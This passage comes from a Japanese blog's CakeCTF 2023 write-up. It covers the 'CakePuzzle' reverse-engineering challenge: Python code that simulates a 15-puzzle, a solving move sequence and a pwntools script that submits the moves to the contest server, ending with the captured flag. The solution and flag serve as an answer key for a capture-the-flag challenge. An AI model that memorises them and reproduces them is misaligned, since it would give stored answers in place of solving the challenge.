    <span class=n>puzzle</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>)][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
    <span class=n>index</span><span class=p>,</span> <span class=n>sorted_puzzle</span> <span class=o>=</span> <span class=nb>zip</span><span class=p>(</span><span class=o>*</span><span class=nb>sorted</span><span class=p>(</span><span class=nb>zip</span><span class=p>(</span><span class=n>sorted_index</span><span class=p>,</span> <span class=n>puzzle</span><span class=p>)))</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
        <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>sorted_puzzle</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>2</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>     
    
<span class=k>def</span> <span class=nf>show_slide</span><span class=p>():</span>
    <span class=n>counter</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
        <span class=k>if</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
            <span class=n>counter</span> <span class=o>+=</span> <span class=mi>1</span>
            <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>10</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
            <span class=k>if</span> <span class=n>counter</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>show_state_slide</span><span class=p>():</span>
    <span class=n>sorted_index</span><span class=p>,</span> <span class=n>sorted_puzzle</span> <span class=o>=</span> <span class=n>puzzle_index</span><span class=p>()</span>
    <span class=n>state_puzzle</span><span class=p>(</span><span class=n>sorted_index</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>slide</span><span class=p>(</span><span class=n>vec</span><span class=p>):</span>
    <span class=n>vec_list</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>vec</span><span class=p>)</span>
    <span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>vec_list</span><span class=p>:</span>
        <span class=n>e</span><span class=p>(</span><span class=n>v</span><span class=p>)</span>
    <span class=n>show_state_slide</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>解いた結果、次のシーケンスでパズルが解けました。<code>q</code>メソッドから返ってくる値が0になることも確認できました。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>slide</span><span class=p>(</span><span class=s2>&#34;RURDDRULLDRULULDRRUULLDRDRRDLLLUURDDLUUURDLURRDDRULDRULLDRRUULLDRDRULLURRDLDRULLURDLLU&#34;</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;q = </span><span class=si>{</span><span class=n>q</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</code></pre></td></tr></table>
</div>
</div><div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>vagrant@vagrant:~/repo/cakectf2023/rev/cakepuzzle$ python3 main.py
1146640091 1277362948 0002245791 1729795767 
1817593079 2146722439 1860814889 1557802610 
0000000000 1770948809 0870734415 1355570260 
0323584794 1405652852 0629508793 1928951512 

05 06 01 10 
12 15 13 09 
00 11 04 07 
02 08 03 14 
[2, 0, R]
&lt;Move&gt;R: 32, 36
...
[1, 0, U]
&lt;Move&gt;U: 16, 0
00 01 02 03 
04 05 06 07 
08 09 10 11 
12 13 14 15 
q = 0
</code></pre></td></tr></table>
</div>
</div><p>このシーケンスを送るコードを書いて、サーバーに送信するとflagが得られました。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=kn>import</span> <span class=nn>time</span>

<span class=n>solver</span> <span class=o>=</span> <span class=s2>&#34;RURDDRULLDRULULDRRUULLDRDRRDLLLUURDDLUUURDLURRDDRULDRULLDRRUULLDRDRULLURRDLDRULLURDLLU&#34;</span>

<span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;others.2023.cakectf.com&#34;</span><span class=p>,</span> <span class=mi>14001</span><span class=p>)</span>

<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>solver</span><span class=p>)):</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>solver</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>solver</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s2>&#34;utf-8&#34;</span><span class=p>))</span>

<span class=nb>print</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>readline</span><span class=p>())</span>
</code></pre></td></tr></table>
</div>
</div><p>よってflagは<code>CakeCTF{wh0_at3_a_missing_pi3c3_0f_a_cak3}</code>です。</p>
<h2 id=終わりに>終わりに</h2>
<p>今までの知識を全て活用して問題が解けたときはやはり面白いなと参加して感じました。
特に、学校の授業で習ったことが活用できた時は、勉強しといてよかったと思うことが多いです。
自分でも好きなことを勉強して、面白いと感じれる機会を増やしていきたいと思います。</p>
<p>最後に、このCakeCTF2023の運営を行っていただいた方々、このような楽しい大会を開催していただきありがとうございました。</p>
</section>
<footer class=article-footer>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css integrity="sha256-J+iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s=" crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js integrity="sha256-InsNdER1b2xUewP+pKCUJpkhiqwHgqiPXDlIk7GzBu4=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-content--wrapper>
<h2 class=section-title>関連するコンテンツ</h2>
<div class=related-content>
<div class="flex article-list--tile">
<article>
<a href=https://hiro-1219.github.io/blog/p/wanictf2023-writeup/>
<div class=article-details>
<h2 class=article-title>WaniCTF2023 WriteUp</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<footer class=site-footer>
<section class=copyright>
&copy;
2022 -
2023 やじるしのブログ
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
テーマ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.12.0>Stack</a></b> は <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> によって設計されています。
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">目次</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li>
<ol>
<li><a href=#はじめに>はじめに</a></li>
</ol>
</li>
<li><a href=#web>web</a>
<ol>
<li><a href=#country-db-web-warmup>Country DB [web, warmup]</a></li>
<li><a href=#towfl-cheat-web>TOWFL [cheat, web]</a></li>
</ol>
</li>
<li><a href=#rev>rev</a>
<ol>
<li><a href=#nande-warmup-rev>nande [warmup, rev]</a></li>
<li><a href=#cakepuzzle-rev>CakePuzzle [rev]</a></li>
</ol>
</li>
<li><a href=#終わりに>終わりに</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://hiro-1219.github.io/blog/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>